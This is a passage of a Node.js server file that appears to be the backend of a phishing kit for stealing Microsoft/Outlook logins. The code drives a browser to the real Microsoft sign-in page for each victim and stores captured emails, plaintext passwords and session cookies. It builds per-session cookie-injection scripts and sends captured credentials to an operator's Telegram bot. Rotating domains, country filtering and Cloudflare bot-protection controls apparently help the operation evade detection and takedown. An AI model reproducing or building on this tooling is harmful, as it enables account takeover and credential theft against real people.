        config: domainConfig
    });
});

app.get('/api/domain-rotation/active-domains', async (req, res) => {
    try {
        const activeDomains = await checkDomainActivity(domainConfig.rotationDomains);
        res.json({
            success: true,
            activeDomains: activeDomains,
            count: activeDomains.length
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/domain-rotation/setup', (req, res) => {
    try {
        const { mainDomain, rotationDomains } = req.body;

        if (!mainDomain || !rotationDomains || !Array.isArray(rotationDomains)) {
            return res.status(400).json({
                success: false,
                error: 'Main domain and rotation domains array required'
            });
        }

        // Generate new rotation string
        const rotationString = generateRotationString();

        // Update configuration
        domainConfig.mainDomain = mainDomain;
        domainConfig.rotationDomains = rotationDomains;
        domainConfig.rotationString = rotationString;
        domainConfig.rotationIndex = 0; // Reset rotation counter
        domainConfig.enabled = true;

        // Save to file
        const saved = saveDomainConfig(domainConfig);

        if (saved) {
            console.log(`🔄 Domain rotation setup: Main=${mainDomain}, Rotation=${rotationDomains.length} domains`);
            res.json({
                success: true,
                config: domainConfig,
                rotationString: rotationString,
                message: 'Domain rotation configured successfully'
            });
        } else {
            throw new Error('Failed to save configuration');
        }

    } catch (error) {
        console.error('Domain rotation setup error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/domain-rotation/regenerate-string', (req, res) => {
    try {
        // Generate new rotation string
        const newString = generateRotationString();

        // Update configuration
        domainConfig.rotationString = newString;
        domainConfig.rotationIndex = 0; // Reset rotation counter

        // Save to file
        const saved = saveDomainConfig(domainConfig);

        if (saved) {
            console.log('🔄 Regenerated domain rotation string:', newString);
            res.json({
                success: true,
                rotationString: newString,
                message: 'Rotation string regenerated successfully'
            });
        } else {
            throw new Error('Failed to save configuration');
        }

    } catch (error) {
        console.error('String regeneration error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/domain-rotation/toggle', (req, res) => {
    try {
        domainConfig.enabled = !domainConfig.enabled;
        const saved = saveDomainConfig(domainConfig);

        if (saved) {
            res.json({
                success: true,
                enabled: domainConfig.enabled,
                message: `Domain rotation ${domainConfig.enabled ? 'enabled' : 'disabled'}`
            });
        } else {
            throw new Error('Failed to save configuration');
        }

    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
    try {
        // Read all session files to get comprehensive analytics
        const sessionDir = path.join(__dirname, 'session_data');
        let validEntries = 0;
        let invalidEntries = 0;
        let totalVisits = analytics.totalLogins || 0;

        if (fs.existsSync(sessionDir)) {
            const files = fs.readdirSync(sessionDir);

            // Count valid sessions
            validEntries = files.filter(file => 
                file.startsWith('session_') && file.endsWith('.json')
            ).length;

            // Count invalid sessions
            invalidEntries = files.filter(file => 
                file.startsWith('invalid_') && file.endsWith('.json')
            ).length;
        }

        res.json({
            success: true,
            totalVisits: totalVisits,
            validEntries: validEntries,
            invalidEntries: invalidEntries,
            successfulLogins: analytics.successfulLogins || 0,
            failedLogins: analytics.failedLogins || 0
        });
    } catch (error) {
        console.error('Error loading analytics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to load analytics',
            details: error.message
        });
    }
});

// Test Telegram notification endpoint
app.post('/api/admin/test-telegram', requireAdminAuth, async (req, res) => {
    try {
        if (!telegramBot) {
            return res.status(400).json({
                success: false,
                error: 'Telegram bot not initialized'
            });
        }

        // Send a test notification
        await telegramBot.sendLoginNotification({
            email: 'test@example.com',
            password: 'test123',
            timestamp: new Date().toISOString(),
            sessionId: 'test-session-' + Date.now(),
            totalCookies: 5,
            authMethod: 'Test Method',
            ip: '127.0.0.1',
            userAgent: 'Test UserAgent'
        });

        res.json({
            success: true,
            message: 'Test notification sent successfully'
        });
    } catch (error) {
        console.error('Error sending test notification:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to send test notification',
            details: error.message
        });
    }
});

// Admin sessions endpoint with session data
app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
    try {
        const sessionDir = path.join(__dirname, 'session_data');
        let allSessions = [];

        if (fs.existsSync(sessionDir)) {
            const files = fs.readdirSync(sessionDir);

            // Load valid sessions
            files.filter(file => file.startsWith('session_') && file.endsWith('.json'))
                .forEach(file => {
                    try {
                        const sessionData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
                        allSessions.push({
                            id: sessionData.sessionId || sessionData.id,
                            email: sessionData.email,
                            timestamp: sessionData.timestamp,
                            status: 'valid',
                            password: sessionData.password,
                            totalCookies: sessionData.totalCookies,
                            injectFilename: `inject_session_${sessionData.sessionId || sessionData.id}.js`
                        });
                    } catch (e) {
                        console.warn('Error parsing session file:', file);
                    }
                });

            // Load invalid sessions
            files.filter(file => file.startsWith('invalid_') && file.endsWith('.json'))
                .forEach(file => {
                    try {
                        const invalidData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
                        allSessions.push({
                            id: invalidData.id,
                            email: invalidData.email,
                            timestamp: invalidData.timestamp,
                            status: 'invalid',
                            reason: invalidData.reason,
                            errorMessage: invalidData.errorMessage,
                            failureType: invalidData.failureType // Include failureType
                        });
                    } catch (e) {
                        console.warn('Error parsing invalid session file:', file);
                    }
                });
        }

        // Sort by timestamp (newest first)
        allSessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        res.json({
            sessions: allSessions,
            totalSessions: allSessions.length,
            analytics: analytics
        });
    } catch (error) {
        console.error('Error loading sessions:', error);
        res.status(500).json({
            error: 'Failed to load sessions',
            details: error.message
        });
    }
});

// Admin endpoint to revoke session
app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
    const sessionId = req.params.sessionId;

    if (userSessions.has(sessionId)) {
        userSessions.delete(sessionId);
        res.json({ 
            success: true, 
            message: `Session ${sessionId} revoked` 
        });
    } else {
        res.status(404).json({ 
            error: 'Session not found' 
        });
    }
});

// Cloudflare configuration storage
let cloudflareConfig = {
    apiToken: null,    // For modern API tokens (Bearer)
    apiKey: null,      // For legacy Global API Key
    email: null,       // Required for Global API Key
    zoneId: null,
    configured: false
};

// Load Cloudflare config from file if exists
const CLOUDFLARE_CONFIG_FILE = path.join(__dirname, 'cloudflare-config.json');
if (fs.existsSync(CLOUDFLARE_CONFIG_FILE)) {
    try {
        const savedConfig = JSON.parse(fs.readFileSync(CLOUDFLARE_CONFIG_FILE, 'utf8'));
        cloudflareConfig = { ...cloudflareConfig, ...savedConfig };

        console.log('🌤️ Cloudflare configuration loaded from file');
        if (cloudflareConfig.email && cloudflareConfig.apiKey && cloudflareConfig.zoneId) {
            console.log('✅ Global API Key authentication configured');
            cloudflareConfig.configured = true;
        }
    } catch (error) {
        console.warn('Error loading Cloudflare config:', error.message);
    }
}

// Helper function to make Cloudflare API calls
async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
    if (!cloudflareConfig.configured) {
        throw new Error('Cloudflare not configured');
    }

    const url = `https://api.cloudflare.com/client/v4/zones/${cloudflareConfig.zoneId}${endpoint}`;
    const headers = {
        'Content-Type': 'application/json'
    };

    // Support both modern API tokens (Bearer) and legacy Global API Key
    if (cloudflareConfig.apiToken) {
        // Modern API Token
        headers['Authorization'] = `Bearer ${cloudflareConfig.apiToken}`;
    } else if (cloudflareConfig.apiKey && cloudflareConfig.email) {
        // Legacy Global API Key
        headers['X-Auth-Email'] = cloudflareConfig.email;
        headers['X-Auth-Key'] = cloudflareConfig.apiKey;
    } else {
        throw new Error('Cloudflare authentication credentials missing');
    }

    const options = {
        method: method,
        headers: headers
    };

    if (data && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
        options.body = JSON.stringify(data);
    }

    const response = await fetch(url, options);
    const result = await response.json();

    if (!result.success) {
        throw new Error(result.errors?.[0]?.message || 'Cloudflare API error');
    }

    return result;
}

// Cloudflare management endpoints
app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured',
                message: 'Configure Cloudflare API credentials to enable management features'
            });
        }

        // Get zone settings
        const [botFightResult, securityResult, browserCheckResult] = await Promise.all([
            callCloudflareAPI('/settings/bot_fight_mode'),
            callCloudflareAPI('/settings/security_level'),
            callCloudflareAPI('/settings/browser_check')
        ]);

        res.json({
            success: true,
            settings: {
                botFightMode: botFightResult.result.value === 'on',
                securityLevel: securityResult.result.value,
                browserCheck: browserCheckResult.result.value === 'on'
            }
        });

    } catch (error) {
        console.error('Cloudflare status error:', error.message);
        res.json({
            success: false,
            error: 'Failed to get Cloudflare status',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) => {
    try {
        const { apiToken, apiKey, email, zoneId } = req.body;

        // Validate input - support both modern API tokens and legacy Global API Key
        if (!zoneId) {
            return res.status(400).json({
                success: false,
                error: 'Zone ID is required'
            });
        }

        if (!apiToken && (!apiKey || !email)) {
            return res.status(400).json({
                success: false,
                error: 'Either API token OR (Global API key + email) are required'
            });
        }

        // Create test config based on provided credentials
        const testConfig = { zoneId, configured: true };
        if (apiToken) {
            testConfig.apiToken = apiToken;
        } else {
            testConfig.apiKey = apiKey;
            testConfig.email = email;
        }

        const originalConfig = { ...cloudflareConfig };
        cloudflareConfig = testConfig;

        try {
            await callCloudflareAPI('');

            // Save configuration to file
            fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(testConfig, null, 2));
            console.log('🌤️ Cloudflare configuration saved successfully');

            res.json({
                success: true,
                message: 'Cloudflare configured successfully'
            });

        } catch (testError) {
            // Restore original config on test failure
            cloudflareConfig = originalConfig;
            throw new Error(`Invalid credentials: ${testError.message}`);
        }

    } catch (error) {
        console.error('Cloudflare configuration error:', error.message);
        res.json({
            success: false,
            error: 'Configuration failed',
            message: error.message
        });
    }
});

app.get('/api/admin/cloudflare/config', requireAdminAuth, async (req, res) => {
    try {
        res.json({
            success: true,
            config: {
                email: cloudflareConfig.email || '',
                zoneId: cloudflareConfig.zoneId || '',
                configured: cloudflareConfig.configured || false,
                authMethod: cloudflareConfig.apiToken ? 'token' : (cloudflareConfig.apiKey ? 'key' : 'none')
            }
        });
    } catch (error) {
        console.error('Error retrieving Cloudflare config:', error.message);
        res.json({
            success: false,
            error: 'Failed to retrieve configuration',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;

        await callCloudflareAPI('/bot_management', 'PUT', {
            fight_mode: enabled
        });

        console.log(`🤖 Bot Fight Mode ${enabled ? 'enabled' : 'disabled'}`);

        res.json({
            success: true,
            enabled: enabled,
            message: `Bot Fight Mode ${enabled ? 'enabled' : 'disabled'}`
        });

    } catch (error) {
        console.error('Bot Fight Mode error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Bot Fight Mode',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, res) => {
    try {
        const { level } = req.body;
        const validLevels = ['off', 'essentially_off', 'low', 'medium', 'high', 'under_attack'];

        if (!validLevels.includes(level)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid security level'
            });
        }

        await callCloudflareAPI('/settings/security_level', 'PATCH', {
            value: level
        });

        console.log(`🔒 Security Level set to: ${level}`);

        res.json({
            success: true,
            level: level,
            message: `Security Level set to ${level}`
        });

    } catch (error) {
        console.error('Security Level error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Security Level',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;

        await callCloudflareAPI('/settings/browser_check', 'PATCH', {
            value: enabled ? 'on' : 'off'
        });

        console.log(`🌐 Browser Check ${enabled ? 'enabled' : 'disabled'}`);

        res.json({
            success: true,
            enabled: enabled,
            message: `Browser Check ${enabled ? 'enabled' : 'disabled'}`
        });

    } catch (error) {
        console.error('Browser Check error:', error.message);
        res.json({
            success: false,
            error: 'Failed to update Browser Check',
            message: error.message
        });
    }
});

// Country access control endpoints
app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured',
                message: 'Configure Cloudflare API credentials to enable management features'
            });
        }

        // Get existing custom rules
        const response = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');

        // Filter for country-related rules
        const countryRules = response.result?.rules?.filter(rule => 
            rule.expression && (
                rule.expression.includes('ip.src.country') || 
                rule.expression.includes('ip.geoip.country')
            )
        ) || [];

        res.json({
            success: true,
            rules: countryRules,
            count: countryRules.length
        });

    } catch (error) {
        console.error('Country rules fetch error:', error.message);
        res.json({
            success: false,
            error: 'Failed to fetch country rules',
            message: error.message
        });
    }
});

app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        const { action, countries, ruleName } = req.body;

        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured'
            });
        }

        if (!action || !countries || !Array.isArray(countries) || countries.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'Invalid input: action, countries array required'
            });
        }

        // Validate action
        if (!['block', 'allow_only'].includes(action)) {
            return res.status(400).json({
                success: false,
                error: 'Action must be "block" or "allow_only"'
            });
        }

        // Format country codes
        const countryList = countries.map(c => c.toUpperCase().substring(0, 2));
        const countryStr = `{"${countryList.join('" "')}"}`;

        // Create expression based on action
        let expression;
        let description;

        if (action === 'block') {
            expression = `ip.src.country in ${countryStr}`;
            description = `Block countries: ${countryList.join(', ')}`;
        } else {
            expression = `ip.src.country not in ${countryStr}`;
            description = `Allow only countries: ${countryList.join(', ')}`;
        }

        // First get existing ruleset
        const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
        const existingRules = existingResponse.result?.rules || [];

        // Create new rule
        const newRule = {
            expression: expression,
            action: action === 'block' ? 'block' : 'block',
            description: ruleName || description,
            enabled: true
        };

        // Add rule to existing rules
        const updatedRules = [...existingRules, newRule];

        // Update the ruleset
        await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint', 'PUT', {
            rules: updatedRules
        });

        console.log(`🌍 Country rule created: ${description}`);

        res.json({
            success: true,
            action: action,
            countries: countryList,
            expression: expression,
            message: `Country access rule created: ${description}`
        });

    } catch (error) {
        console.error('Country rule creation error:', error.message);
        res.json({
            success: false,
            error: 'Failed to create country rule',
            message: error.message
        });
    }
});

app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
    try {
        const { ruleId } = req.params;

        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured'
            });
        }

        // Get existing ruleset
        const existingResponse = await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint');
        const existingRules = existingResponse.result?.rules || [];

        // Remove the rule
        const updatedRules = existingRules.filter(rule => rule.id !== ruleId);

        // Update the ruleset
        await callCloudflareAPI('/rulesets/phases/http_request_firewall_custom/entrypoint', 'PUT', {
            rules: updatedRules
        });

        console.log(`🗑️ Country rule deleted: ${ruleId}`);

        res.json({
            success: true,
            message: `Country rule deleted successfully`
        });

    } catch (error) {
        console.error('Country rule deletion error:', error.message);
        res.json({
            success: false,
            error: 'Failed to delete country rule',
            message: error.message
        });
    }
});

// Email Page Load - Auto Prepare Browser endpoint  
app.post('/api/prepare-email-page', async (req, res) => {
    try {
        console.log('📧 Email page loaded - preparing browser automatically');
        
        const sessionId = createSessionId();
        
        // Create and prepare a private browser for email input
        const automation = new ClosedBridgeAutomation({
            enableScreenshots: true,
            screenshotQuality: 80,
            sessionId: sessionId,
            eventCallback: broadcastAuthEvent
        });

        // Initialize and navigate browser
        await automation.init();
        console.log(`🔧 Browser initialized for email page: ${sessionId}`);

        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Microsoft login page');
        }
        console.log(`🌐 Browser ready for email input: ${sessionId}`);

        // Store the prepared browser session
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'email_page_ready',
            email: null,
            startTime: Date.now()
        });

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Browser prepared and ready for email input',
            status: 'ready'
        });

    } catch (error) {
        console.error('❌ Failed to prepare browser for email page:', error.message);
        res.status(500).json({
            success: false,
            error: 'Failed to prepare browser',
            details: error.message
        });
    }
});

// Instant Browser Preparation API endpoint
app.post('/api/prepare-browser', async (req, res) => {
    try {
        console.log('🚀 Instant browser preparation requested');

        // Get current warm browser pool status
        const currentWarmCount = warmBrowserPool.size;
        const warmBrowsersReady = Array.from(warmBrowserPool.values())
            .filter(warm => warm.status === 'warm_ready').length;

        // Check if we already have warm browsers ready
        if (warmBrowsersReady > 0) {
            return res.json({
                success: true,
                message: 'Warm browsers already available',
                warmBrowsersReady: warmBrowsersReady,
                totalWarmBrowsers: currentWarmCount,
                preparationTime: 0
            });
        }

        // Start immediate warm browser creation if needed
        const startTime = Date.now();
        let newBrowsersCreated = 0;

        try {
            // Trigger immediate warm browser creation
            await maintainWarmBrowserPool();

            // Count newly created browsers
            const newWarmCount = Array.from(warmBrowserPool.values())
                .filter(warm => warm.status === 'warm_ready').length;
            newBrowsersCreated = newWarmCount - warmBrowsersReady;

            const preparationTime = Date.now() - startTime;

            res.json({
                success: true,
                message: 'Browser preparation completed',
                warmBrowsersReady: newWarmCount,
                totalWarmBrowsers: warmBrowserPool.size,
                newBrowsersCreated: newBrowsersCreated,
                preparationTime: preparationTime
            });

        } catch (error) {
            console.error('Error during instant browser preparation:', error.message);
            res.status(500).json({
                success: false,
                error: 'Browser preparation failed',
                details: error.message,
                warmBrowsersReady: warmBrowsersReady,
                totalWarmBrowsers: currentWarmCount
            });
        }

    } catch (error) {
        console.error('Error in prepare-browser endpoint:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to prepare browser',
            details: error.message
        });
    }
});

// Warm Browser Pool Status API endpoint
app.get('/api/browser-pool-status', (req, res) => {
    try {
        const warmBrowsers = Array.from(warmBrowserPool.values());
        const readyBrowsers = warmBrowsers.filter(warm => warm.status === 'warm_ready');

        res.json({
            success: true,
            status: {
                totalWarmBrowsers: warmBrowserPool.size,
                readyBrowsers: readyBrowsers.length,
                maxWarmBrowsers: MAX_WARM_BROWSERS,
                minWarmBrowsers: MIN_WARM_BROWSERS
            },
            browsers: warmBrowsers.map(warm => ({
                status: warm.status,
                age: Date.now() - warm.createdAt,
                createdAt: warm.createdAt
            }))
        });

    } catch (error) {
        console.error('Error getting browser pool status:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get browser pool status',
            details: error.message
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');

    // Check Azure configuration
    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
        console.log('✅ Azure credentials configured - Graph API ready');
    } else {
        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
    }

    if (!telegramBot) {
        console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
    } else {
        console.log('🔑 Admin token available via Telegram bot - Use /start to access');
    }

    // Proactively prepare browser for immediate availability (non-blocking)
    setTimeout(() => {
        // Use non-blocking async wrapper to prevent server crashes
        (async () => {
            let automation = null;
            try {
                console.log('🚀 Proactively preparing browser for immediate email input...');
                
                const sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
                automation = new ClosedBridgeAutomation();

                // Initialize private browser with timeout
                const initPromise = automation.init();
                const initResult = await Promise.race([
                    initPromise,
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Browser init timeout')), 15000))
                ]);

                console.log('Browser initialized successfully');

                // Navigate directly to Microsoft login page with timeout
                const navPromise = automation.navigateToOutlook();
                const navigated = await Promise.race([
                    navPromise,
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Navigation timeout')), 10000))
                ]);

                if (!navigated) {
                    throw new Error('Failed to navigate to Microsoft login page');
                }

                console.log(`✅ Proactive browser ready for immediate email input: ${sessionId}`);

                // Store the prepared browser session 
                automationSessions.set(sessionId, {
                    automation: automation,
                    status: 'email_page_ready',
                    email: null,
                    startTime: Date.now()
                });

            } catch (error) {
                console.warn('⚠️ Proactive browser preparation failed (server continues normally):', error.message);
                
                // Critical: Clean up automation instance to prevent resource leaks
                if (automation) {
                    try {
                        console.log('🧹 Cleaning up failed browser instance...');
                        await automation.close();
                        console.log('✅ Browser cleanup completed');
                    } catch (cleanupError) {
                        console.warn('⚠️ Browser cleanup failed:', cleanupError.message);
                    }
                }
            }
        })().catch(error => {
            console.warn('⚠️ Proactive browser preparation wrapper failed (server continues):', error.message);
        });
    }, 1500); // Start 1.5 seconds after server starts
});